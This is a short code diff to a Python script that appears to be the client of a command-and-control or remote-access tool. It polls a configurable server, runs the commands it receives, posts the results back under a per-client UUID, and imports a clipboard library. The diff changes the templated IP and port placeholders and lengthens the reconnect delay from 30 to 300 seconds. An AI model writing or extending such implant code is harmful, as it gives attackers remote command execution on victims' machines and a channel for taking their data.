@@ -5,8 +5,8 @@ import os
 import subprocess
 import pyperclip
 
-ip = "{{ip}}"
-port = "{{port}}"
+ip = "{ip}"
+port = "{port}"
 server_url = "http://"+ip+":"+port+"/client"
 server_url = "http://127.0.0.1:8080/client"
 client_uuid = str(uuid.uuid4())
@@ -117,8 +117,8 @@ while True:
             print("Command Result:", result)
             requests.post(server_url, headers={"UUID": client_uuid}, json={"command": command,"result": result})
     except requests.ConnectionError as e:
-        print("Connection error, retrying in 30 seconds:", e)
-        time.sleep(30)
+        print("Connection error, retrying in 300 seconds:", e)
+        time.sleep(300)
     except requests.RequestException as e:
         print("Request error:", e)
     except Exception as e:
